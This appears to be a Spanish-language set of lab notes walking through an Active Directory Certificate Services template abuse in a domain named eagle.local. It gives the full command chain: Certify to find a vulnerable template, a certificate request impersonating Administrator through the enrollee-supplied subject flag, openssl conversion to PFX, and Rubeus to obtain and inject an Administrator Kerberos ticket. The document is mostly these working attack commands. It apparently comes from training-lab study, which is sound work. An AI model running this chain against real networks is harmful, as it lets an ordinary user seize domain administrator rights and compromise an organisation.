Para empezar, usaremos [Certify](https://github.com/GhostPack/Certify) para escanear el entorno en busca de vulnerabilidades en la infraestructura PKI
```
.\Certify.exe find /vulnerable
```
![[Pasted image 20260917155606.png]]

Dado que certificado tiene el atributo de CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, cualquier usuario puede solicitar certificado como cualquier otro usuario de la red
```
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```
Una vez que el ataque finalice, obtendremos un certificado con éxito. El comando genera un certificado `PEM` y lo muestra como base64. Necesitamos convertir el certificado `PEM` al formato [`PFX`](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) ejecutando el comando mencionado en la salida de `Certify` (cuando se te pida la contraseña, presiona `Enter` sin proporcionar una). Sin embargo, para estar seguros, primero ejecutemos el siguiente comando para evitar un mal formato del archivo `PEM`.
limpiamos
```
sed -i 's/\s\s\+/\n/g' cert.pem
```
convertimos a pfx
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
con el certificado listo, podemos pedir un tgt de kerberos para la cuenta administrador
```
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```
